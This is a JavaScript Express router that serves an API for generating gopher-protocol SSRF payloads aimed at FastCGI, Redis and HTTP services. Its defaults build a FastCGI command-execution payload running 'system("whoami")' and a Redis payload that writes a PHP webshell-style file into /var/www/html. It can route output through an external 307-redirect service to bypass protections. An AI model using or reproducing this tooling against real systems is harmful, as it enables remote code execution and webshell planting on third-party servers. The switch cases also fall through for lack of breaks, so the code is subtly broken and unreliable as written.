/**
 *
 * Notice: Machines with libcurl version after 7.65.2 do not support changing the protocol to gopher
 * on HTTP redirection by default.
 *
 * @link https://github.com/curl/curl/pull/4094
 * @link https://curl.se/libcurl/c/CURLOPT_REDIR_PROTOCOLS_STR.html
 * @link https://github.com/Esonhugh/Gopherus3/blob/main/gopherus3/module/FastCGI.py
 **/

const express = require('express');
const router = express.Router();
const { body } = require('express-validator');
const fastcgi = require('../utils/gopher/fastcgi');
const redis = require('../utils/gopher/redis');
const http = require('../utils/gopher/http');
const querystring = require('querystring');


for (const [path, gopher] of Object.entries({
    'fastcgi': fastcgi,
    'redis': redis,
    'http': http,
})) {
    router.post('/' + path, validate([
        body('host').optional(),
        body('port').optional().isNumeric().withMessage('Port must be a number')
            .isInt({ min: 1, max: 65535 }).withMessage('Port must be between 1 and 65535'),
        body('urlencode').optional().isString(),
        body('r3dir').optional().isString(),
        body('prefix').optional().isString(),
        body('suffix').optional().isString(),

        body('filename').optional().isString(),
        body('command').optional().isString(),

        body('filepath').optional().isString(),
        body('content').optional().isString(),

        body('path').optional().isString(),
        body('method').optional().isString(),
        body('path').optional().isString(),
        body('type').optional().isString(),
        body('body').optional(),
        body('headers').optional().isObject().withMessage("Invalid JSON"),
    ]), async (req, res, next) => {
        try {
            gopher.host = req.body.host || '127.0.0.1';
            switch(path) {
                case 'fastcgi':
                    gopher.port = req.body.port || 9000;
                    gopher.filename = req.body.filename || '/usr/share/php/PEAR.php';
                    gopher.command = req.body.command || 'system("whoami");';
                case 'redis':
                    gopher.port = req.body.port || '6379';
                    gopher.filepath = req.body.filepath || '/var/www/html';
                    gopher.filename = req.body.filename || 's.php';
                    gopher.content = req.body.content || '<?php evil($_POST["x"]);';
                case 'http':
                    gopher.port = req.body.port || '80';
                    gopher.method = req.body.method || 'GET';
                    gopher.path = req.body.path || '/';
                    gopher.type = req.body.type || 'x-www-form-urlencoded';
                    gopher.body = req.body.body || '';
                    gopher.headers = req.body.headers || {};
            }

            let generated = gopher.generatePayload();
            if (req.body.urlencode) {
                generated = querystring.escape(generated);
            }

            generated = generated.replaceAll("%2F", '/').replaceAll("%3A", ':');

            if (req.body.suffix) {
                generated += "%23%2F" + req.body.suffix;
            }

            if (req.body.r3dir) {
                generated = "//307.r3dir.me/--to/?url=" + generated;
            }

            if (req.body.prefix) {
                generated = req.body.prefix + generated;
            }
            res.send(generated);
        } catch (error) {
            next(error);
        }
    });
}

module.exports = router;
